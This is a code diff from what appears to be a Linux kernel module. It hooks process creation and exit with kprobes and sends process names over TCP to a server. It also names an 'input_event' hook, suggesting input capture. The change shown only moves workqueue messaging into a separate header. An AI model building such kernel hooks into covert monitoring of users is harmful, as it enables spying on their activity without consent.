@@ -9,6 +9,7 @@
 
 #include "headers.h"
 #include "protocol.h"
+#include "workqueue.h"
 #include "tcp_socket.h"
 
 #define HOOK_INPUT_EVENT "input_event"
@@ -42,16 +43,6 @@ static struct socket *sock; // Socket struct
 static bool sock_connected = false; // Boolean value indicating if socket is connected
 static struct mutex sock_mutex; // Mutex lock socket handling
 static struct workqueue_struct *tcp_sock_wq; // Workqueue for sending tcp socket messages
-
-typedef struct wq_msg
-{
-	/* Current mission */
-	struct work_struct work;
-
-	/* Message dara for sending data */
-	char msg_buf[BUFFER_SIZE];
-	size_t length;
-}wq_msg;
 
 /* Attemps to send data to server side */
 static void transmit_data(struct work_struct *work)
@@ -95,30 +86,6 @@ end:
     	kfree(curr_msg);  // Free the work structure
 }
 
-/* Queue a new message to be sent */
-static void workqueue_message(const char *msg, size_t length)
-{
-    	struct wq_msg *work;
-
-    	/* Because we are only able to send the pointer to work_struct
-     	* We will create a 'father' struct for it, which will contain it
-     	* And in the function we will perform container_of in order to get
-     	* The message itself and the length
-     	*/
-    	work = kmalloc(sizeof(wq_msg), GFP_ATOMIC);
-    	if ( !work )
-        	return;
-
-    	/* Initialize the work queue to push to queue */
-    	INIT_WORK(&work->work, transmit_data);
-
-    	memcpy(work->msg_buf, msg, min(length, BUFFER_SIZE - 1));
-    	work->length = min(length, BUFFER_SIZE - 1);
-
-    	/* Thread safe function (dont worry :) )*/
-	queue_work(tcp_sock_wq, &work->work);
-}
-
 /* Fork hook */
 static int handler_pre_do_fork(struct kprobe *kp, struct pt_regs *regs)
 {
@@ -130,7 +97,7 @@ static int handler_pre_do_fork(struct kprobe *kp, struct pt_regs *regs)
 	
 	msg_length = protocol_format(msg_buf, "%s~%s", MSG_PROCESS_OPEN, current->comm);
 	if ( msg_length > 0)
-		workqueue_message(msg_buf, msg_length);
+		workqueue_message(tcp_sock_wq, transmit_data, msg_buf, msg_length);
 
 	return 0;
 }
@@ -146,7 +113,7 @@ static int handler_pre_do_exit(struct kprobe *kp, struct pt_regs *regs)
 	
 	msg_length = protocol_format(msg_buf, "%s~%s", MSG_PROCESS_CLOSE, current->comm);
         if ( msg_length > 0)
-                workqueue_message(msg_buf, msg_length);
+                workqueue_message(tcp_sock_wq, transmit_data, msg_buf, msg_length);
 
         return 0;
 
